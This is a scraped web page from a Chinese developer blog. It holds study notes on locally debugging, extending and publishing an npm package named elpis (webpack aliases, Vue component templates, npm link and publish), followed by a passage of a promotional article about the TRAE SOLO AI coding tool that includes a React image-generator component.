li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>本文内容学习自 哲玄前端 《大前端全栈实践》课程</p>
</blockquote>
<p>当需要本地调试待发布的 npm 包时
在包的目录下(elpis)执行命令</p>
<pre><code class="hljs language-bash" lang="bash">npm <span class="hljs-built_in">link</span>
</code></pre>
<p>在使用包的目录下(elpis-demo)执行命</p>
<pre><code class="hljs language-bash" lang="bash">npm <span class="hljs-built_in">link</span> <span class="hljs-string">"name"</span>
</code></pre>
<ul>
<li>这个 name 就是 elpis/package.json 中的name</li>
</ul>
<h4 data-id="heading-0">关于静态资源目录</h4>
<p>运行的时候一直会有 <code>/view/project-list</code> 的请求</p>
<ul>
<li>elpis/app/view/entry.tpl 中使用了静态资源 /static/xxx</li>
<li>koaStatic 和 KoaNunjucks 配置的静态资源目录是 process.cwd()/app/public
<ul>
<li>资源请求的是运行目录下的 elpis-demo/app/public</li>
</ul>
</li>
<li>实际资源还在 elpis/app/public/static/logo.png，但是 elpis-demo 中没有静态资源导致一直请求不到</li>
<li>请求进入 elpis-core/loader/router.js 兜底策略一直请求 app.options.homePage</li>
</ul>
<p>解决办法：将静态资源移动到 elpis-demo/public 中</p>
<h4 data-id="heading-1">devServer 和 element-plus 的按需加载</h4>
<p><code>不能用element-plus的按需引入</code>，不然 npm run build:dev 就一直卡在 webpack 的编译部分，npm run build:prod 就正常运行。</p>
<ul>
<li>虽然 devServer 正常启动了</li>
<li>但是 webpack 的编译器根本没有启动，没有将源代码编译为 Bundle。
<ul>
<li>第一步还得自己先手动编译一下(compiler.run)，不然一直没编译，没有.tpl的输出。  启动静态服务器，但是没有HMR的效果，加watch只能监听变化，手动刷新才看得到。</li>
</ul>
</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/89df3339cc4349ffbf0fa5d11c1ca161~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YWoXw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765850717&amp;x-signature=agfYT9avnJwimMIiuzCK%2FDhq7Xk%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-2">自定义SSR页面的扩展</h2>
<p>在 webpack.base.js 中修改 entry 和 HtmlWebpackPlugin 来获取全部的入口。</p>
<p>webpack里面的loader会在调用方里面的根目录开始找（即在 elpis-demo 的 node_modules）</p>
<ul>
<li>
<p>如果用自己 node_modules 的目录，改为 require.resolve()</p>
<ul>
<li>如果找不到包 用require.resolve()</li>
</ul>
</li>
<li>
<p>当这个 webpack 配置作为 npm 包被其他项目引用时，loader 的解析路径会基于 elpis 包本身，而不是调用方的 node_modules。</p>
</li>
</ul>
<p>在 <code>elpis-demo/app/pages</code> 目录下写入口文件 entry.xxx.js 和对应组件</p>
<h2 data-id="heading-3">自定义 view 页面 dashboard/cutom-view</h2>
<ol>
<li>在 <code>elpis-demo/app/pages/dashboard/xxx</code> 写页面组件</li>
<li>在 <code>elpis-demo/app/pages/dashboard/router.js</code> 中进行配置</li>
</ol>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = <span class="hljs-function">(<span class="hljs-params">{routes, siderRoutes}</span>) =&gt;</span> {}
</code></pre>
<h3 data-id="heading-4">当用户没配置 dashboard/router.js</h3>
<ul>
<li>try-catch无法解决
<ul>
<li>webpack是静态构建，并不是运行时构建，所以会直接报错</li>
</ul>
</li>
</ul>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">try</span>{
  businessDashboardRouterConfig = <span class="hljs-built_in">require</span>(<span class="hljs-string">'$businessDashboardRouterConfig'</span>)
}<span class="hljs-keyword">catch</span> (e) {}
</code></pre>
<ul>
<li>import的方式无法解决 依旧报错</li>
</ul>
<pre><code class="hljs language-javascript" lang="javascript">(<span class="hljs-keyword">async</span> () =&gt; {
  businessDashboardRouterConfig = <span class="hljs-keyword">await</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">'$businessDashboardRouterConfig'</span>)
})()
</code></pre>
<p>解决方案</p>
<ol>
<li>
<p>创建空文件让 webpack 别名指向它作为 fallback</p>
<ol>
<li>
<pre><code class="hljs language-javascript" lang="javascript">      <span class="hljs-attr">alias</span>: (<span class="hljs-function">() =&gt;</span> {
        <span class="hljs-keyword">const</span> aliasMap = {}
        <span class="hljs-keyword">const</span> blankModulePath = path.<span class="hljs-title function_">resolve</span>(__dirname, <span class="hljs-string">'../libs/blankModule.js'</span>)

        <span class="hljs-keyword">const</span> businessDashboardRouterConfigPath = path.<span class="hljs-title function_">resolve</span>(process.<span class="hljs-title function_">cwd</span>(), <span class="hljs-string">'app/pages/dashboard/router.js'</span>)
        aliasMap[<span class="hljs-string">'$businessDashboardRouterConfig'</span>] = fs.<span class="hljs-title function_">existsSync</span>(businessDashboardRouterConfigPath)
          ? businessDashboardRouterConfigPath
          : blankModulePath

        <span class="hljs-keyword">return</span> {
          ...aliasMap,
        }
      })(),
</code></pre>
</li>
<li>简单、但是需要额外维护文件</li>
</ol>
</li>
<li>
<p>编译时常量 + if 判断</p>
<ol>
<li>
<pre><code class="hljs language-javascript" lang="javascript">      <span class="hljs-keyword">new</span> webpack.<span class="hljs-title class_">DefinePlugin</span>({
        <span class="hljs-attr">__HAS_BUSINESS_DASHBOARD_ROUTER__</span>: fs.<span class="hljs-title function_">existsSync</span>() <span class="hljs-comment">// true/false</span>
      }),
</code></pre>
<pre><code class="hljs language-javascript" lang="javascript">    <span class="hljs-keyword">if</span>(__HAS_BUSINESS_DASHBOARD_ROUTER__) {...}
</code></pre>
<p>不会往 window 上挂变量；不会在运行时代码里真的出现 __HAS_...__ 这个名字。</p>
<p>webpack 在构建时会做常量折叠：<strong>如果这个宏是 <code>false</code>，整块 <code>if</code> 分支会被摇掉</strong></p>
</li>
<li>
<p>无额外文件，但是定义全局变量进行编译期宏替换</p>
</li>
</ol>
</li>
<li>
<p>反向依赖——由业务入口调用基础库</p>
</li>
</ol>
<h2 data-id="heading-5">动态组件扩展 dashboard/schema-view/components</h2>
<ol>
<li>在 <code>app/pages/dashboard/complex-view/schema-view/components/</code> 下写组件</li>
</ol>
<ul>
<li>components的统一写法</li>
</ul>
<pre><code class="hljs language-javascript" lang="javascript">&lt;script setup&gt;
<span class="hljs-keyword">import</span> { ref } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>

<span class="hljs-keyword">const</span> name = <span class="hljs-title function_">ref</span>(<span class="hljs-string">'createForm'</span>)

<span class="hljs-keyword">const</span> isShow = <span class="hljs-title function_">ref</span>(<span class="hljs-literal">false</span>)

<span class="hljs-keyword">const</span> <span class="hljs-title function_">show</span> = (<span class="hljs-params"/>) =&gt; {
  isShow.<span class="hljs-property">value</span> = <span class="hljs-literal">true</span>
}

<span class="hljs-keyword">const</span> <span class="hljs-title function_">close</span> = (<span class="hljs-params"/>) =&gt; {
  isShow.<span class="hljs-property">value</span> = <span class="hljs-literal">false</span>
}

<span class="hljs-title function_">defineExpose</span>({
  name,
  show,
})
&lt;/script&gt;

<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span></span>

<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">scoped</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"less"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span></span>
</code></pre>
<ol start="2">
<li>配置<code>app/pages/dashboard/complex-view/schema-view/components/component-config.js</code></li>
</ol>
<h2 data-id="heading-6">schema-form 控件扩展</h2>
<ol>
<li>在<code>app/pages/widgets/schema-form/complex-view/</code>下写组件</li>
</ol>

<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">

<span class="hljs-keyword">const</span> <span class="hljs-title function_">validate</span> = (<span class="hljs-params"/>) =&gt; {}

<span class="hljs-keyword">const</span> <span class="hljs-title function_">getValue</span> = (<span class="hljs-params"/>) =&gt; {}

<span class="hljs-title function_">defineExpose</span>({
  name,
  validate,
  getValue,
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">scoped</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"less"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
</code></pre>
<p>2.  配置<code>app/pages/widgets/schema-form/form-item-config.js</code></p>
<h2 data-id="heading-7">schema-search-bar 控件的扩展</h2>
<ol>
<li>在<code>app/pages/widgets/schema-search-bar/complex-view/</code>下写组件</li>
</ol>

<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">

<span class="hljs-keyword">const</span> <span class="hljs-title function_">reset</span> = (<span class="hljs-params"/>) =&gt; {}

<span class="hljs-keyword">const</span> <span class="hljs-title function_">getValue</span> = (<span class="hljs-params"/>) =&gt; {}

<span class="hljs-title function_">defineExpose</span>({
  reset,
  getValue,
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">scoped</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"less"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
</code></pre>
<p>2.  配置<code>app/pages/widgets/schema-search-bar/search-item-config.js</code></p>
<h2 data-id="heading-8">发布</h2>
<pre><code class="hljs language-bash" lang="bash">npm config get registry
-&gt; https://registry.npmjs.org/
如果不是， npm config <span class="hljs-built_in">set</span> registry
</code></pre>
<pre><code class="hljs language-bash" lang="bash">npm login

npm <span class="hljs-built_in">whoami</span>

npm publish --access public
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[TRAE SOLO 正式版：AI全链路开发的新范式 🚀]]></title>    <link>https://juejin.cn/post/7581329603777773604</link>    <guid>https://juejin.cn/post/7581329603777773604</guid>    <pubDate>2025-12-09T02:16:31.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581329603777773604" data-draft-id="7581350888789557284" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="TRAE SOLO 正式版：AI全链路开发的新范式 🚀"/> <meta itemprop="keywords" content="前端,Trae"/> <meta itemprop="datePublished" content="2025-12-09T02:16:31.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="dorisrv"/> <meta itemprop="url" content="https://juejin.cn/user/1522178380270712"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            TRAE SOLO 正式版：AI全链路开发的新范式 🚀
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1522178380270712/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    dorisrv
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-09T02:16:31.000Z" title="Tue Dec 09 2025 02:16:31 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">TRAE SOLO 正式版：AI全链路开发的新范式 🚀</h2>
<h3 data-id="heading-1">🤔 为什么选择 TRAE SOLO？</h3>
<p>在AI应用开发的全流程中，开发者往往面临着工具链割裂、协作效率低下、部署流程复杂等痛点。TRAE SOLO正式版作为一款整合式AI开发工具，通过SOLO coder、DiffView等核心功能，为开发者提供了从代码编写、调试优化到最终部署的全链路解决方案。</p>
<p>想象一下：</p>
<ul>
<li>当你需要快速实现一个AI功能时，<strong>SOLO coder</strong> 能智能生成高质量代码</li>
<li>当你需要对比不同实现方案时，<strong>DiffView</strong> 能清晰展示代码差异</li>
<li>当你需要部署应用时，工具提供了一键式部署流程</li>
</ul>
<p>这就是TRAE SOLO带来的全新开发体验！</p>
<h3 data-id="heading-2">💡 TRAE SOLO 核心功能详解</h3>
<h4 data-id="heading-3">1. SOLO coder：智能代码生成的得力助手</h4>
<p>SOLO coder是TRAE SOLO的核心功能之一，它利用先进的AI模型，根据自然语言描述生成高质量代码。</p>
<h5 data-id="heading-4">基础使用示例</h5>
<p>假设我们需要实现一个基于React的AI图片生成组件：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 使用 SOLO coder 生成的 React AI 图片生成组件</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span>, { useState, useRef } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;
<span class="hljs-keyword">import</span> axios <span class="hljs-keyword">from</span> <span class="hljs-string">'axios'</span>;

<span class="hljs-keyword">const</span> <span class="hljs-title function_">AIImageGenerator</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">const</span> [prompt, setPrompt] = <span class="hljs-title function_">useState</span>(<span class="hljs-string">''</span>);
  <span class="hljs-keyword">const</span> [loading, setLoading] = <span class="hljs-title function_">useState</span>(<span class="hljs-literal">false</span>);
  <span class="hljs-keyword">const</span> [imageUrl, setImageUrl] = <span class="hljs-title function_">useState</span>(<span class="hljs-string">''</span>);
  <span class="hljs-keyword">const</span> [error, setError] = <span class="hljs-title function_">useState</span>(<span class="hljs-string">''</span>);
  <span class="hljs-keyword">const</span> fileInputRef = <span class="hljs-title function_">useRef</span>(<span class="hljs-literal">null</span>);

  <span class="hljs-comment">// 生成图片的核心函数</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">generateImage</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-keyword">if</span> (!prompt.<span class="hljs-title function_">trim</span>()) {
      <span class="hljs-title function_">setError</span>(<span class="hljs-string">'请输入描述词'</span>);
      <span class="hljs-keyword">return</span>;
    }

    <span class="hljs-keyword">try</span> {
      <span class="hljs-title function_">setLoading</span>(<span class="hljs-literal">true</span>);
      <span class="hljs-title function_">setError</span>(<span class="hljs-string">''</span>);
      <span class="hljs-title function_">setImageUrl</span>(<span class="hljs-string">''</span>);

      <span class="hljs-comment">// 调用 AI 图片生成 API</span>
      <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> axios.<span class="hljs-title function_">post</span>(<span class="hljs-string">'/api/generate-image'</span>, {
        prompt,
        <span class="hljs-attr">n</span>: <span class="hljs-number">1</span>,
        <span class="hljs-attr">size</span>: <span class="hljs-string">'1024x1024'</span>
      });

      <span class="hljs-keyword">if</span> (response.<span class="hljs-property">data</span>?.<span class="hljs-property">images</span>?.[<span class="hljs-number">0</span>]) {
        <span class="hljs-title function_">setImageUrl</span>(response.<span class="hljs-property">data</span>.<span class="hljs-property">images</span>[<span class="hljs-number">0</span>]);
      } <span class="hljs-keyword">else</span> {
        <span class="hljs-title function_">setError</span>(<span class="hljs-string">'图片生成失败，请重试'</span>);
      }
    } <span class="hljs-keyword">catch</span> (err) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'生成图片出错:'</span>, err);
      <span class="hljs-title function_">setError</span>(<span class="hljs-string">'网络错误，请检查连接后重试'</span>);
    } <span class="hljs-keyword">finally</span> {
      <span class="hljs-title function_">setLoading</span>(<span class="hljs-literal">false</span>);
    }
  };

  <span class="hljs-comment">// 保存图片到本地</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">saveImage</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-keyword">if</span> (imageUrl &amp;&amp; fileInputRef.<span class="hljs-property">current</span>) {
      <span class="hljs-keyword">const</span> link = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">'a'</span>);
      link.<span class="hljs-property">href</span> = imageUrl;
      link.<span class="hljs-property">download</span> = <span class="hljs-string">`ai-image-<span class="hljs-subst">${<span class="hljs-built_in">Date</span>.now()}</span>.png`</span>;
      link.<span class="hljs-title function_">click</span>();
    }
  };

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"ai-image-generator"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"generator-header"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>✨ AI 图片生成器<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>输入描述词，让AI为你创作独特的图片<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>

      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"generator-content"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"input-section"</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">textarea</span>
            <span class="hljs-attr">value</span>=<span class="hljs-string">{prompt}</span>
            <span class="hljs-attr">onChange</span>=<span class="hljs-string">{(e)</span> =&gt;</span> setPrompt(e.target.value)}
            placeholder="请输入图片描述，例如：一只可爱的柯基在草地上奔跑，阳光明媚，细节丰富"
            rows={3}
          /&gt;
          <span class="hljs-tag">&lt;<span class="hljs-name">button</span>
            <span class="hljs-attr">onClick</span>=<span class="hljs-string">{generateImage}</span>
            <span class="hljs-attr">disabled</span>=<span class="hljs-string">{loading}</span>
            <span class="hljs-attr">className</span>=<span class="hljs-string">"generate-btn"</span>
          &gt;</span>
            {loading ? '生成中...' : '生成图片'}
          <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>

        {error &amp;&amp; <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"error-message"</span>&gt;</span>⚠️ {error}<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>}

        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"result-section"</span>&gt;</span>
          {imageUrl ? (
            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"image-container"</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">{imageUrl}</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">"AI生成的图片"</span> /&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">button</span>
                <span class="hljs-attr">onClick</span>=<span class="hljs-string">{saveImage}</span>
                <span class="hljs-attr">className</span>=<span class="hljs-string">"save-btn"</span>
              &gt;</span>
                💾 保存图片
              <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
          ) : (
            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"empty-state"</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>🎨 输入描述词，开始你的创作之旅<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
          )}
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
};

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">AIImageGenerator</span>;
</code></pre>
<h5 data-id="heading-5">SOLO coder 高级技巧</h5>
<ol>
<li>
<p><strong>精确提示工程</strong></p>
<pre><code class="hljs language-markdown" lang="markdown">// 好的提示：
帮我生成一个使用 React Hooks 的图片上传组件，包含预览、拖拽上传、进度显示和错误处理功能

// 更好的提示：
帮我生成一个使用 React 18 + TypeScript 的图片上传组件，要求：
<span class="hljs-bullet">1.</span> 使用 useState 和 useRef Hooks
<span class="hljs-bullet">2.</span> 支持拖拽上传和点击选择
<span class="hljs-bullet">3.</span> 实时显示上传进度
<span class="hljs-bullet">4.</span> 支持 JPG、PNG、WebP 格式验证
<span class="hljs-bullet">5.</span> 限制文件大小为 5MB
<span class="hljs-bullet">6.</span> 提供友好的错误提示
</code></pre>
</li>
<li>
<p><strong>迭代式代码生成</strong></p>
<ul>
<li>先生成基础功能</li>
<li>然后逐步添加高级特性</li>
<li>最后优化性能和用户体验</li>
</ul>
</li>
</ol>
<h4 data-id="heading-6">2. DiffView：代码差异可视化的利器</h4>
<p>DiffView功能让开发者能够直观地比较不同版本的代码，分析变更内容，提升协作效率和代码质量。</p>
<h5 data-id="heading-7">基础使用示例</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 原始版本：简单的图片加载组件</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">ImageLoader</span> = (<span class="hljs-params">{ src, alt }</span>) =&gt; {
  <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">{src}</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">{alt}</span> /&gt;</span></span>;
};

<span class="hljs-comment">// 优化版本：带加载状态和错误处理的图片组件</span>
